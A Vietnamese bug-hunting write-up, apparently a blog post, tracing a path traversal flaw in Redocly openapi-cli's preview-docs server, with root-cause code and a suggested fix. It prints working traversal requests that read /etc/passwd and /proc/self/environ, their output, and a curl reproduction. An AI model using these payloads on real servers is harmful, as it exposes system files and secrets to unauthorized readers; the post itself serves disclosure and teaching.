## A weird bug

Gần đây mình có gặp 1 case như thế này (tạm đặt tên là `target.com`).

```
https://target.com/jsp/help-sb-download.jsp?sbFileName=../../../../../../../../../../etc/passwd
```

thì trả về là:

```
root:x:0:0:root:/root:/bin/bash
....
```

Một case LFI rõ ràng quá rồi. Và mình kiểm tra lại CVE tương ứng với lỗi kia thì nó là **CVE-2020-8209**:

> Improper access control in Citrix XenMobile Server 10.12 before RP2, Citrix XenMobile Server 10.11 before RP4, Citrix XenMobile Server 10.10 before RP6 and Citrix XenMobile Server before 10.9 RP5 and leads to the ability to read arbitrary files.

Xem thêm ở: [https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/](https://swarm.ptsecurity.com/path-traversal-on-citrix-xenmobile-server/)

Tuy nhiên để cho chắc cú thì mình vẫn thử với các payload LFI khác trong nuclei và phát hiện ra một điều kì lạ:

![](https://images.viblo.asia/daa0fc9c-2dd0-47a6-9b93-d527cef86cd7.png)

What the hell ???. Universal LFI à 🤣
Vậy khả năng là không phải CVE kia rồi, và có thể đây là một lỗi misconfiguration của server chăng. Để biết được thì chúng ta cần thêm 1 số thông tin.

## More fuzzing

Thông thường với các lỗi LFI, để có thêm thông tin, ta sẽ cố gắng đọc các file config hoặc các thư mục, file đặc biệt. Một trong số đó là `/proc/self`. Thư mục này chứa thông tin về chính tiến trình đang xử lý request của chúng ta.

Đầu tiên là `/proc/self/environ` sẽ cho thông tin các biến môi trường của tiến trình. Request thử ra rất nhiều thông tin khác nhau:

```
YARN_VERSION=1.22.5
npm_node_execpath=/usr/local/bin/node
npm_package_dependencies__types_lodash=^4.14.170
npm_package_dependencies__types_figlet=^1.5.1
npm_package_devDependencies_nodemon=^2.0.7
npm_package_devDependencies_fast_xml_parser=^3.19.0
npm_config_init_version=1.0.0
...
STATIC_ROOT_SERVER_PORT_80_TCP_PORT=80
...
PWD=/usr/app
...
PATH=/tmp/yarn--1629865924820-0.6746905619158616:/usr/app/node_modules/.bin:/usr/local/share/.config/yarn/link/node_modules/.bin:/usr/local/libexec/lib/node_modules/npm/bin/node-gyp-bin:/usr/local/lib/node_modules/npm/bin/node-gyp-bin:/usr/local/bin/node_modules/npm/bin/node-gyp-bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
NODE=/usr/local/bin/node
```

vậy khả năng đến 90% là ứng dụng này chạy nodejs rồi. Và khả năng là do lỗi ứng dụng chứ không phải lỗi cấu hình server sai.

Tiếp theo là `/proc/self/cmdline`: trả ra câu lệnh dùng để thực thi chương trình này.

![](https://images.viblo.asia/f9af94c6-194b-452a-bc78-8ec060d0c1a2.png)

ta chú ý đến phần cuối có `openapi preview-docs`. Google với từ khóa này trên mạng đưa mình đến repo sau:

https://github.com/Redocly/openapi-cli

> ⚒️ OpenAPI CLI toolbox with rich validation and bundling features.

Túm lại là một công cụ generate trang document từ file OpenAPi spec, giống như Swagger vậy.

Công cụ này là một phần của https://redoc.ly/ và repo https://github.com/Redocly/redoc : 

![](https://images.viblo.asia/eb5cd315-14a7-43a0-9215-e15aa17bb477.png)

OK, thử dựng môi trường local và debug thử thôi.

## Local reproduce

Sau khi clone repo trên về để tham khảo source code, mình cũng cài luôn package trong thư mục đó:

```
npm install @redocly/openapi-cli
```

> Nếu bạn muốn reproduce lại thì cần cài đúng phiên bản bị lỗi: 1.0.0-beta.54

Sau khi cài xong thì chạy 

```
➜  openapi-cli git:(master) ✗ node node_modules/@redocly/openapi-cli/bin/cli.js preview-docs -p 8899  resources/pets.yaml
Using Redoc community edition.
Login with openapi-cli login or use an enterprise license key to preview with the premium docs.


  🔎  Preview server running at http://127.0.0.1:8899

  👀  Watching resources/pets.yaml and all related resources for changes


Bundling...

Created a bundle for resources/pets.yaml successfully
```

và thử lại payload:

```
➜  Vigo curl "http://localhost:8899/?id=../../../../../../../../../../etc/passwd" -v
*   Trying 127.0.0.1:8899...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8899 (#0)
> GET /?id=../../../../../../../../../../etc/passwd HTTP/1.1
> Host: localhost:8899
> User-Agent: curl/7.68.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Content-Type: application/octet-stream
< Date: Thu, 30 Sep 2021 02:51:54 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< Transfer-Encoding: chunked
<
root:x:0:0:root:/root:/bin/bash
...
```

vẫn hoạt động tốt. Vậy hung thủ là đây chứ còn ai nữa.

## Root cause
Sau khoảng một lúc đọc hiểu code thì mình tìm ra phần xử lý lệnh `preview-docs` này nằm ở file 
`node_modules/@redocly/openapi-cli/lib/commands/preview-docs/preview-server/preview-server.js` và phần chúng ta cần quan tâm là hàm này:

```js
function startPreviewServer(port, { getBundle, getOptions, useRedocPro, }) {
    return __awaiter(this, void 0, void 0, function* () {
        const defaultTemplate = path.join(__dirname, 'default.hbs');
        const handler = (request, response) => __awaiter(this, void 0, void 0, function* () {
            console.time(colorette.dim(`GET ${request.url}`));
            const { htmlTemplate } = getOptions() || {};
            if (request.url === '/') {
                server_1.respondWithGzip(getPageHTML(htmlTemplate || defaultTemplate, getOptions(), useRedocPro, wsPort), request, response, {
                    'Content-Type': 'text/html',
                });
            }
            else if (request.url === '/openapi.json') {
                const bundle = yield getBundle();
                if (bundle === undefined) {
                    server_1.respondWithGzip(JSON.stringify({
                        openapi: '3.0.0',
                        info: {
                            description: '<code> Failed to generate bundle: check out console output for more details </code>',
                        },
                        paths: {},
                    }), request, response, {
                        'Content-Type': 'application/json',
                    });
                }
                else {
                    server_1.respondWithGzip(JSON.stringify(bundle), request, response, {
                        'Content-Type': 'application/json',
                    });
                }
            }
            else {
                const filePath = 
                // @ts-ignore
                {
                    '/hot.js': path.join(__dirname, 'hot.js'),
                    '/simplewebsocket.min.js': require.resolve('simple-websocket/simplewebsocket.min.js'),
                }[request.url || ''] ||
                    path.resolve(htmlTemplate ? path.dirname(htmlTemplate) : process.cwd(), `.${request.url}`);
                const extname = String(path.extname(filePath)).toLowerCase();
                const contentType = server_1.mimeTypes[extname] || 'application/octet-stream';
                try {
                    server_1.respondWithGzip(yield fs_1.promises.readFile(filePath), request, response, {
                        'Content-Type': contentType,
                    });
                }
                catch (e) {
                    if (e.code === 'ENOENT') {
                        server_1.respondWithGzip('404 Not Found', request, response, { 'Content-Type': 'text/html' }, 404);
                    }
                    else {
                        server_1.respondWithGzip(`Something went wrong: ${e.code || e.message}...\n`, request, response, {}, 500);
                    }
                }
            }
            console.timeEnd(colorette.dim(`GET ${request.url}`));
        });
        let wsPort = yield portfinder.getPortPromise({ port: 32201 });
        const server = server_1.startHttpServer(port, handler);
        server.on('listening', () => {
            process.stdout.write(`\n  🔎  Preview server running at ${colorette.blue(`http://127.0.0.1:${port}\n`)}`);
        });
        return server_1.startWsServer(wsPort);
    });
}
```

với request `?id=../../../../../../../../../../etc/passwd` thì `request.url` sẽ không match với bất cứ rule nào và nhảy vào đoạn else cuối cùng và đến đoạn:

```js
                const filePath = 
                // @ts-ignore
                {
                    '/hot.js': path.join(__dirname, 'hot.js'),
                    '/simplewebsocket.min.js': require.resolve('simple-websocket/simplewebsocket.min.js'),
                }[request.url || ''] ||
                    path.resolve(htmlTemplate ? path.dirname(htmlTemplate) : process.cwd(), `.${request.url}`);
                const extname = String(path.extname(filePath)).toLowerCase();
```
sẽ resolve đường dẫn file và đọc nội dung. Đoạn `filePath` này trông có vẻ lằng nhằng nhưng có thể thu gọn về thành:

```js
const filePath = path.resolve(process.cwd(), `.${request.url}`)
```

Giả sử đường dẫn của chúng ta là `/home/vigo/open-cli`, với `request.url` là `/text.txt` chẳng hạn, sẽ được ghép thành `./test.txt` và resolve kèm với thư mục hiện tại với mong muốn lấy ra file trong thư mục này. Nhưng đời không như là mơ:

![](https://images.viblo.asia/21478f7a-5c54-42cd-ad7f-e93994396bf8.png)

với cách này ta đã khai thác được lỗi path traversal, cho phép đọc file tùy ý.

## The end

Vậy để fix bug này chúng ta cần làm 2 việc:
1. Đơn giản chỉ cần strip bỏ toàn bộ các query param, hash fragment rồi mới đưa qua hàm `path.resolve`.
2. Không sử dụng các câu lệnh dev/preview chạy trên production (chắc bác dev này muốn tiết kiệm tiền, không muốn dùng bản premium đây mà 🤣).

> Nhớ cập nhật lên phiên bản mới để không bị lỗi nữa nhé

See ya~